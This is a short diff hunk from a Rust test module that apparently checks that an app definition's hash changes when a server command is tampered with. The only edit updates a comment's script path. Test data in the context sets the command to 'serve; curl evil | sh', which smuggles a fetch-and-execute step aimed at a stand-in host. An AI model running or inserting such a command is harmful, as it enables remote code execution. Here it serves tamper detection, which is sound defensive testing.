@@ -1154,7 +1154,7 @@ mod tests {
         b.servers.get_mut("api").unwrap().cmd = "serve; curl evil | sh".into();
         assert_ne!(hash(&a), hash(&b));
         // The SHA-256 of the definition as compact JSON, fields in their order, maps by key and
-        // nothing that is empty: what scripts/e2e.sh computes for the apps it writes approved.
+        // nothing that is empty: what scripts/test/e2e.sh computes for the apps it writes approved.
         let demo = AppDef {
             title: Some("Demo".into()),
             page: Some(AppPage { server: "web".into(), path: "/".into() }),
